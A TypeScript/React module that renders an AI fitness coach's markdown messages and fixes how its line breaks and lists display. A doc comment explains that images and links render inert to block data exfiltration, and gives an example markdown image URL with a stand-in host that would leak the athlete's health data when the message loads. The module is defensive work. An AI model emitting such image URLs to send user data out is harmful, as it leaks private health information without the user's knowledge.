import type { ReactNode } from 'react'
import type { Components } from 'react-markdown'

/** A paragraph of the coach's message, with space before the next one. */
const paragraph = ({ children }: { children?: ReactNode }) => (
  <p className="mt-2 first:mt-0">{children}</p>
)

// Bullets and an indent: Tailwind's preflight takes both off every list, and
// the paragraphs' margins too, so the coach's lists and paragraphs ran
// together (ai-trainer-ops#308).
const LIST = 'mt-2 first:mt-0 space-y-1 pl-5 marker:text-gray-500'

/**
 * How the coach's message body is rendered as markdown.
 *
 * Headings become plain paragraphs so the chat keeps one font size.
 *
 * `img` and `a` render inert (#677). react-markdown renders no raw HTML
 * without `rehype-raw`, so this was never an XSS question — it is an egress
 * one. A rendered `![](https://host/?d=…)` fetches that URL the moment the
 * message paints, with no click and nothing visible to the athlete, and the
 * coach prompt carries the athlete's health data by construction (#499). Since
 * the LLM has no tool-calling, a remote reference in its reply is the *only*
 * way text the model produces can leave the browser. The CSP in `nginx.conf`
 * is the second, independent layer.
 *
 * Nothing is lost by this: the coach's citations do not come through markdown
 * at all — they arrive structured on `msg.sources` and are rendered as real
 * links in `AIChat`. So there is no legitimate reason for a link or an image in
 * the message body, and the alt/label text is kept so nothing disappears
 * silently either.
 *
 * It lives in its own module rather than in `AIChat.tsx` so the egress
 * guarantee can be tested without standing up the chat component and its
 * mocks — and because exporting a non-component from a component file breaks
 * fast refresh.
 */
export const MARKDOWN_COMPONENTS: Components = {
  h1: paragraph,
  h2: paragraph,
  h3: paragraph,
  h4: paragraph,
  h5: paragraph,
  h6: paragraph,
  p: paragraph,
  ul: ({ children }) => <ul className={`${LIST} list-disc`}>{children}</ul>,
  ol: ({ children, start }) => (
    <ol start={start} className={`${LIST} list-decimal`}>
      {children}
    </ol>
  ),
  img: ({ alt }) => (
    <span className="text-gray-400 italic">{alt ? `[image: ${alt}]` : '[image]'}</span>
  ),
  a: ({ href, children }) => (
    <span>
      {children}
      {href ? <span className="text-gray-400"> ({href})</span> : null}
    </span>
  ),
}

type MarkdownNode = { type: string; value?: string; children?: MarkdownNode[] }

/** Each line break in a text as a break of its own, below ``node``. */
function breakLines(node: MarkdownNode): void {
  if (!node.children) return
  node.children = node.children.flatMap((child) => {
    if (child.type !== 'text' || !child.value?.includes('\n')) {
      breakLines(child)
      return [child]
    }
    return child.value
      .split('\n')
      .flatMap((line, i) => [...(i ? [{ type: 'break' }] : []), { type: 'text', value: line }])
  })
}

/**
 * A line break in the coach's text stays one (ai-trainer-ops#308).
 *
 * Markdown makes a single line break a space: the opening message's lines ran
 * on in one wrapped line. A remark plugin rather than `whitespace-pre-line`:
 * in a list with blank lines between its items, the line breaks between the
 * item's blocks would show as empty lines. Code is left alone: it is not text.
 */
export function remarkLineBreaks() {
  return (tree: MarkdownNode) => breakLines(tree)
}

// A list item: "-", "*" or "+", or a number with "." or ")", then a space.
const LIST_ITEM = /^\s*(?:[-*+]|\d{1,9}[.)])(?:\s|$)/
const FENCE = /^\s*(?:```|~~~)/

/**
 * The coach's text with each list ended before the line that follows it
 * (ai-trainer-ops#308).
 *
 * A line right after a list item belongs to that item in markdown, unless a
 * blank line comes between (CommonMark's lazy continuation). The opening
 * message's assumptions and its pinned-questions sentence became part of the
 * last example that way. A blank line before such a line ends the list. An
 * indented line stays the item's: that one is meant. Done here, at render
 * time, so the messages already stored show right too.
 */
export function endListsBeforeProse(text: string): string {
  const lines: string[] = []
  let inList = false
  let inFence = false
  for (const line of text.split('\n')) {
    if (FENCE.test(line)) {
      inFence = !inFence
    } else if (!inFence) {
      if (LIST_ITEM.test(line)) {
        inList = true
      } else if (!line.trim()) {
        inList = false
      } else if (inList && !/^\s/.test(line)) {
        lines.push('')
        inList = false
      }
    }
    lines.push(line)
  }
  return lines.join('\n')
}
